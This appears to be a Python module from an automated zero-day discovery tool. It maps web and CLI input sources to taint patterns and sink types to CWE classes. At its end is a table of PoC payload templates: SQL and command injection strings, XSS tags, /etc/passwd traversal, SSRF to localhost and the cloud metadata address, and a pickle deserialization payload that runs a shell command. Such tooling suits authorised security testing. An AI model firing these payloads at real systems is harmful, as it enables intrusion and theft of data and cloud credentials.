"""Anti-Corruption Layer — translators between 0-day bounded contexts.

The ACL translates domain objects from one context into the language of
another, preventing tight coupling between contexts. Each context maintains
its own ubiquitous language; the ACL handles the mapping.

Call chain: EntryPoint → DataFlow → Sink → PoC
"""

from __future__ import annotations

from miya.zeroday.entrypoint.domain import CodeBase, EntryPoint, InputVector
from miya.zeroday.dataflow.domain import TaintPath, TaintSession, TaintSink, TaintSource
from miya.zeroday.sink.domain import Exploitability, SinkAnalysis, SinkPattern
from miya.zeroday.poc.domain import PoCPayload, PoCProject


# ═══════════════════════════════════════════════════════════════════
#  EntryPoint → DataFlow
# ═══════════════════════════════════════════════════════════════════

# Map entrypoint input vector sources to dataflow taint source types
_INPUT_SOURCE_TO_TAINT: dict[str, str] = {
    "query": "http_param",
    "body": "http_body",
    "path": "http_param",
    "header": "http_header",
    "cookie": "cookie",
    "file": "file_read",
    "cli_arg": "cli_arg",
    "env": "env_var",
    "stdin": "stdin",
    "websocket": "websocket",
}


def entry_points_to_taint_session(
    codebase: CodeBase,
) -> TaintSession:
    """Translate a CodeBase's entry points into a TaintSession for analysis.

    Maps each EntryPoint's InputVectors to TaintSources that the
    DataFlow context can use for taint tracing.
    """
    session = TaintSession(
        target_path=codebase.target_uri,
        codebase_id=codebase.id,
    )
    return session


def entry_point_to_source_patterns(
    entry_point: EntryPoint,
) -> list[str]:
    """Extract Semgrep-compatible source patterns from an EntryPoint.

    Produces taint source patterns the DataFlow agent can pass
    to the taint engine.
    """
    patterns: list[str] = []
    for iv in entry_point.input_vectors:
        if iv.sanitized:
            continue
        # Build a generic source pattern based on input source type
        pattern = _source_pattern_for(iv)
        if pattern:
            patterns.append(pattern)
    return patterns


def input_vector_to_taint_source(
    iv: InputVector,
    entry_point: EntryPoint,
) -> TaintSource:
    """Translate a single InputVector into a TaintSource."""
    return TaintSource(
        parameter=iv.name,
        source_type=_INPUT_SOURCE_TO_TAINT.get(iv.source, "http_param"),  # type: ignore[arg-type]
        file_path=entry_point.file_path,
        line_number=entry_point.line_number,
        entry_point=entry_point.endpoint,
    )


def _source_pattern_for(iv: InputVector) -> str:
    """Generate a Semgrep source pattern for an input vector."""
    mapping: dict[str, str] = {
        "query": "request.args.get(...)",
        "body": "request.data",
        "path": "request.view_args",
        "header": "request.headers.get(...)",
        "cookie": "request.cookies.get(...)",
        "file": "request.files.get(...)",
        "cli_arg": "sys.argv",
        "env": "os.environ.get(...)",
        "stdin": "sys.stdin.read()",
        "websocket": "websocket.receive()",
    }
    return mapping.get(iv.source, "")


# ═══════════════════════════════════════════════════════════════════
#  DataFlow → Sink
# ═══════════════════════════════════════════════════════════════════

# Map dataflow sink types to CWE IDs for the sink context
_SINK_TYPE_TO_CWE: dict[str, tuple[str, str]] = {
    "sql_query": ("CWE-89", "SQL Injection"),
    "command_exec": ("CWE-78", "OS Command Injection"),
    "file_write": ("CWE-73", "External Control of File Name or Path"),
    "file_read": ("CWE-22", "Path Traversal"),
    "html_render": ("CWE-79", "Cross-site Scripting (XSS)"),
    "ldap_query": ("CWE-90", "LDAP Injection"),
    "xpath_query": ("CWE-643", "XPath Injection"),
    "xml_parse": ("CWE-611", "XML External Entity (XXE)"),
    "deserialization": ("CWE-502", "Deserialization of Untrusted Data"),
    "redirect": ("CWE-601", "Open Redirect"),
    "ssrf": ("CWE-918", "Server-Side Request Forgery (SSRF)"),
    "path_traversal": ("CWE-22", "Path Traversal"),
    "code_eval": ("CWE-94", "Code Injection"),
    "template_render": ("CWE-1336", "Server-Side Template Injection (SSTI)"),
    "log_injection": ("CWE-117", "Log Injection"),
    "crypto_key": ("CWE-321", "Use of Hard-coded Cryptographic Key"),
}


def taint_path_to_sink_analysis(
    path: TaintPath,
    taint_session_id: str,
) -> SinkAnalysis:
    """Translate a TaintPath into a SinkAnalysis for confirmation.

    Only unsanitized (exploitable) paths should be translated —
    the caller filters before invoking this.
    """
    cwe_id, cwe_name = _SINK_TYPE_TO_CWE.get(
        path.sink.sink_type, ("", "Unknown"),
    )

    return SinkAnalysis(
        taint_session_id=taint_session_id,
        sink_function=path.sink.function,
        file_path=path.sink.file_path,
        line_number=path.sink.line_number,
        pattern=SinkPattern(
            cwe_id=cwe_id,
            cwe_name=cwe_name,
            function_pattern=path.sink.function,
        ) if cwe_id else None,
    )


def taint_paths_to_sink_analyses(
    session: TaintSession,
) -> list[SinkAnalysis]:
    """Translate all exploitable taint paths into SinkAnalysis objects.

    Filters to only unsanitized paths — sanitized paths are not
    candidates for sink confirmation.
    """
    analyses: list[SinkAnalysis] = []
    for path in session.exploitable_paths():
        analysis = taint_path_to_sink_analysis(path, session.id)
        analyses.append(analysis)
    return analyses


# ═══════════════════════════════════════════════════════════════════
#  Sink → PoC
# ═══════════════════════════════════════════════════════════════════

# Default payload templates per CWE for initial PoC construction
_CWE_PAYLOAD_TEMPLATES: dict[str, list[dict[str, str]]] = {
    "CWE-89": [
        {"name": "sqli_union", "content": "' UNION SELECT NULL,NULL--", "expected": "additional data in response"},
        {"name": "sqli_error", "content": "' AND 1=CONVERT(int,(SELECT @@version))--", "expected": "database version in error"},
        {"name": "sqli_blind_bool", "content": "' AND 1=1--", "expected": "different response than AND 1=2"},
    ],
    "CWE-78": [
        {"name": "cmdi_semicolon", "content": "; id", "expected": "uid= in output"},
        {"name": "cmdi_pipe", "content": "| whoami", "expected": "username in output"},
        {"name": "cmdi_backtick", "content": "`id`", "expected": "uid= in output"},
    ],
    "CWE-79": [
        {"name": "xss_script", "content": "<script>alert(document.domain)</script>", "expected": "script tag in response"},
        {"name": "xss_img", "content": '<img src=x onerror=alert(1)>', "expected": "img tag in response"},
    ],
    "CWE-22": [
        {"name": "pathtraversal_etc_passwd", "content": "../../../../etc/passwd", "expected": "root: in response"},
        {"name": "pathtraversal_double_encode", "content": "%252e%252e%252fetc/passwd", "expected": "root: in response"},
    ],
    "CWE-918": [
        {"name": "ssrf_localhost", "content": "http://127.0.0.1:80/", "expected": "internal service response"},
        {"name": "ssrf_metadata", "content": "http://169.254.169.254/latest/meta-data/", "expected": "cloud metadata"},
    ],
    "CWE-502": [
        {"name": "deser_pickle", "content": "import pickle; pickle.dumps(type('X',(),{'__reduce__':lambda s:(__import__('os').system,('id',))})())", "expected": "uid= in output"},
    ],
}


def sink_analysis_to_poc_project(
    analysis: SinkAnalysis,
) -> PoCProject:
    """Translate a confirmed SinkAnalysis into a PoCProject.

    Pre-populates the project with payload templates appropriate
    for the vulnerability class.
    """
    cwe_id = analysis.pattern.cwe_id if analysis.pattern else ""
    vuln_type = analysis.pattern.cwe_name if analysis.pattern else "Unknown"

    project = PoCProject(
        sink_analysis_id=analysis.id,
        vuln_type=vuln_type,
        cwe_id=cwe_id,
        target_file=analysis.file_path,
    )

    # Pre-populate with payload templates for this CWE
    templates = _CWE_PAYLOAD_TEMPLATES.get(cwe_id, [])
    for tmpl in templates:
        payload = PoCPayload(
            name=tmpl["name"],
            content=tmpl["content"],
            expected_behavior=tmpl.get("expected", ""),
            payload_type="http_request",
            target_parameter=analysis.sink_function,
        )
        project.add_payload(payload)

    return project


def confirmed_sinks_to_poc_projects(
    analyses: list[SinkAnalysis],
) -> list[PoCProject]:
    """Translate all confirmed SinkAnalysis objects into PoCProjects.

    Only confirmed (non-false-positive) analyses are translated.
    """
    return [
        sink_analysis_to_poc_project(a)
        for a in analyses
        if a.confirmed
    ]
